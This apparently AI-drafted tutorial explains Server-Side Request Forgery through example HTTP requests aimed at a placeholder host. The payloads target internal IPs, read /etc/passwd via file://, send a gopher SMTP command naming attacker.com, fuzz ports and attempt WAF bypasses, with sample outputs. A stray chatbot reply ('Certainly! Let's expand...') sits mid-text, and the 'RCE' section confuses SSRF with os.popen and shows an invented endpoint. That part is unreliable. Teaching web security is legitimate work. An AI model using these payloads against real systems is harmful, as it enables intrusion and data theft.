# 👀 SSRF

Server-Side Request Forgery (SSRF) is a vulnerability that occurs when a web application fetches resources from a remote location based on user-supplied input. In such cases, the attacker can manipulate the URL or resource input to trick the server into making unauthorized requests, potentially exposing internal systems, sensitive information, or allowing arbitrary code execution.

SSRF vulnerabilities exploit situations where user input influences the URLs or resources fetched by a web server. Common attack vectors include bypassing **firewall restrictions**, accessing internal services (such as **databases** or **admin panels**), reading **local files** (LFI), or causing **denial-of-service** conditions.

### **1. What Is SSRF?**

#### **How SSRF Works**

A typical SSRF attack involves tricking a vulnerable web application into sending requests to arbitrary, user-specified URLs. These requests can be used to:

* **Bypass Web Application Firewalls (WAFs)** and access restricted or internal endpoints.
* **Access internal network services** such as databases or admin panels, typically protected from external access.
* **Read local files** (LFI), allowing attackers to enumerate files on the server.
* **Trigger unintended actions**, such as sending emails or interacting with other services (e.g., SMTP servers).

If a web application fetches external resources or makes network calls based on user input (URLs, IPs, etc.), the attacker can manipulate the input to make requests to internal or sensitive resources.

#### **Common Schemes Used in SSRF Attacks**:

* **http:// and https://**: These protocols can bypass firewalls, access restricted endpoints, or reach endpoints in the internal network.
* **file://**: This protocol allows attackers to read local files on the web server, exposing sensitive data such as `/etc/passwd` or configuration files.
* **gopher://**: This protocol allows sending arbitrary bytes to the specified address and can be used to send HTTP POST requests with payloads or communicate with services like SMTP servers or databases.

Certainly! Let's expand on the **Server-Side Request Forgery (SSRF)** vulnerability, especially the basic scenarios, and include more **advanced payloads** and **detailed context**. We'll also dive deeper into the nuances of SSRF and provide additional practical examples with context, Burp Suite requests, responses, and shell commands.

#### Example: Web Application Fetching External Files

Consider a web application that allows users to retrieve data by supplying a **URL** as an input:

```http
POST /fetchData HTTP/1.1
Host: webapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 456

dataUrl=http://external-server.com/file.json
```

In this example, the application fetches data from a user-supplied URL (i.e., `dataUrl` parameter). An attacker can manipulate the `dataUrl` parameter to target internal services that should be **inaccessible externally**, such as the local server, internal network, or local files.

***

### **Basic Payloads and Exploitation**

#### **1. Internal IP Access and Bypassing Firewalls**

One of the simplest forms of SSRF is to change the URL to point to an **internal IP address** such as `127.0.0.1` or `localhost`, which can help attackers bypass firewalls that restrict **external** requests.

**Example Attack:**

Let's manipulate the `dataUrl` to point to the **internal server**:

```http
POST /fetchData HTTP/1.1
Host: webapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 456

dataUrl=http://127.0.0.1:8080/admin
```

* **Expected Behavior:** The server sends a request to `127.0.0.1:8080`, where it could interact with an internal admin panel or other internal service.
* **Possible Result:** The attacker could access restricted resources or **privileged endpoints** normally inaccessible from outside.

***

#### **2. Bypassing Protocol Restrictions (file://)**

SSRF can also be used to exploit applications that fetch files based on user input. By using the `file://` protocol, an attacker can instruct the server to **read local files** on the web server (Local File Inclusion, or LFI).

**Example Attack:**

We attempt to read the `/etc/passwd` file on the server, which contains critical information about the system's user accounts:

```http
POST /fetchData HTTP/1.1
Host: webapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 456

dataUrl=file:///etc/passwd
```

* **Expected Behavior:** The server will try to fetch the file at `file:///etc/passwd`.
* **Result:** The attacker might receive the contents of `/etc/passwd`, revealing sensitive information, such as usernames and user IDs.

#### **Possible Output:**

```plaintext
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

***

#### **3. Exploiting with Uncommon Protocols (gopher://)**

A more advanced SSRF payload involves using the **gopher protocol**, which is often overlooked. This protocol can be used to communicate with different services like SMTP, databases, or even send arbitrary bytes to a target.

**Example Attack:**

We can try using the **gopher protocol** to send arbitrary requests to an internal **SMTP server** or other services:

```http
POST /fetchData HTTP/1.1
Host: webapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 456

dataUrl=gopher://127.0.0.1:25/_HELO+attacker.com
```

* **Expected Behavior:** The gopher protocol sends a request to the internal SMTP server running on port `25`.
* **Result:** If successful, this could potentially allow an attacker to communicate with internal services (e.g., SMTP server), trigger **remote interactions**, or even exfiltrate data.

***

### **Advanced Payloads and Scenarios**

#### **1. Port Scanning via SSRF**

One powerful way to exploit SSRF is **port scanning**. If an attacker knows or suspects that the web server can communicate with internal services, they can use SSRF to **enumerate open ports** on `localhost` or within the internal network.

**Advanced Payload (Port Scanning):**

```http
POST /fetchData HTTP/1.1
Host: webapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 456

dataUrl=http://127.0.0.1:FUZZ/
```

Here, `FUZZ` will be replaced with various port numbers to check if they are open. For example, an attacker can scan ports from `1` to `10000` using **Burp Suite** or a tool like **ffuf**.

#### **Burp Suite Example:**

1. **Intercept** the request.
2. Use Burp's **Intruder** to fuzz the `dataUrl` parameter with a list of ports:

```bash
seq 1 10000 > ports.txt
```

```http
POST /fetchData HTTP/1.1
Host: webapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 456

dataUrl=http://127.0.0.1:FUZZ/
```

* **Expected Behavior:** The response will indicate whether the port is open or closed.
* **Response Example (Open Port):**

```http
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Internal Admin Panel</h1>
<p>Welcome, admin. You have access to sensitive resources.</p>
```

***

#### **2. Exploiting SSRF for Remote Code Execution (RCE)**

An SSRF vulnerability can sometimes be used to trigger **Remote Code Execution (RCE)** if the server has access to services that can execute arbitrary commands.

**Advanced RCE Payload (Remote Code Execution):**

In Python-based web applications (e.g., Flask or Django), SSRF can be combined with Python's **os.popen()** or **subprocess** functions to execute system commands.

```http
POST /fetchData HTTP/1.1
Host: webapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 456

dataUrl=http://127.0.0.1:8080/system?id&fileType=pdf
```

Here, we are attempting to run the `id` command internally, which will print the user ID of the system.

* **Expected Response:**

```plaintext
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

If this works, the attacker has executed a system-level command, revealing user information, and potentially escalating the attack to more severe consequences.

***

### **3. Bypassing WAFs (Web Application Firewalls)**

Some web applications use **WAFs** to block certain malicious requests. However, SSRF can often bypass WAFs, especially when using HTTP or HTTPS schemes to target internal services.

**Advanced Payload (Bypassing WAFs):**

```http
POST /fetchData HTTP/1.1
Host: webapp.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 456

dataUrl=http://localhost:8081/internal_admin
```

* **Expected Behavior:** The WAF might block requests containing `localhost` or `127.0.0.1`. But if it’s configured incorrectly, SSRF could still succeed with more subtle IP obfuscation techniques (e.g., `::1` for IPv6).
